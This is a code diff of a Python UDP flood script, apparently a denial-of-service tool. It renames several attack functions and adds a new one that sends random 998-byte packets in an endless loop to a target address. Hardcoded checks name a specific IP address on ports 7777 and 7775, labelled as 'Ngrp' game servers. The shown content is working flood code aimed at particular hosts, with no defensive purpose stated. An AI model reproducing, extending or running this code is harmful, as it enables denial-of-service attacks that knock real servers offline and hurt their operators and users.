@@ -66,7 +66,7 @@ if choice=="yes" or choice=="y":
     print("SORRY, CURRENTLY THIS OPTION IS DISABLED DUE TO SOME ISSUES")
     time.sleep(1)
     print("CHOOSE OPTION 3")
-  def xxx():
+  def A():
     data = random._urandom(998)
     i = random.choice(("[•]","[•]","[•]"))
     while True:
@@ -83,7 +83,7 @@ if choice=="yes" or choice=="y":
             print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
       except:
         print("[!] Server Attack")
-  def xx():
+  def B():
     data = random._urandom(998)
     i = random.choice(("[•]","[•]","[•]"))
     while True:
@@ -100,7 +100,24 @@ if choice=="yes" or choice=="y":
             print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
       except:
         print("[!] Server Attack")
-  def x():
+  def H():
+    data = random._urandom(998)
+    i = random.choice(("[•]","[•]","[•]"))
+    while True:
+      try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        addr = (str(ip),int(port))
+        for x in range(times):
+          s.sendto(data,addr)
+          if ip=="103.166.228.31"and port==7777:
+            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
+          elif ip=="103.166.228.31"and port==7775:
+            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
+          else:
+            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+      except:
+        print("[!] Server Attack")
+  def I():
     data = random._urandom(998)
     i = random.choice(("[•]","[•]","[•]"))
     while True:
